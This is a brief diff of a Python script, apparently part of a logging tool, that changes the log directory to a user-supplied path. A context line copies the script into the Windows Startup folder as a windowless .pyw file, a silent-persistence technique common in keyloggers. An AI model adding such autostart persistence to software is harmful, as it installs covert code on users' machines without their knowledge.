@@ -4,7 +4,7 @@ import logging
 from shutil import copyfile
 
 username = os.getlogin()
-logging_dir = f"C:/Users/{username}/Desktop"
+logging_dir = input("Where do you want the log file to be saved? ")
 
 copyfile('main.py', f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.pyw")
 
